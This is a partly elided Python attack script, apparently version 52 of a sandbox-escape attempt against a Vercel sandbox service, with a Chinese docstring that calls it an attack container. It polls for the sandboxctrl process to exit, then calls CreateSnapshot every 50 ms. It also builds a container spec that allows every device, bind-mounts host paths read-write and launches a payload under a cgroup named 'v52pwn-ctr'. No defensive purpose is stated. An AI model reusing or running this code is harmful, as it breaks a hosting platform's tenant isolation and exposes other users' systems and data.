# -*- coding: utf-8 -*-
"""vda52: 攻击容器内轮询 sandboxctrl 退出 -> 连打 CreateSnapshot (v51 增强版)
v51 教训: 容器创建成功但日志写盘, 沙箱被驱动 DELETE 后盘丢失
v52 专用驱动: failed 后 resume -> sudo mount 读盘 -> 再删
payload 增强: 轮询 Tasks/Get 观察 sandboxctrl 退出时序 + 50ms 连打
"""
import os, time, socket, ctypes, re, struct, subprocess, json

OUT = '/vercel/sandbox/v52m.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v52m.out'
...
def log(s):
    ...
    try:
        ...
        pass
    try:
        open('/mnt/root/v52c.out', 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    try:
        print(line, flush=True)
...
def main():
    ...
    pf = '/mnt/vdax/root/v52_payload.py'
    try:
    ...
    spec = {
        ...
        "process": {
            ...
            "args": ["/bin/sh", "-c",
                     ...
                     "python3 /mnt/root/v52_payload.py; sleep 99999"],
        ...
        "mounts": [
            ...
            {"destination": "/vercel/sandbox", "type": "bind", "source": "/vercel/sandbox", "options": ["rbind", "rw"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v52pwn-ctr",
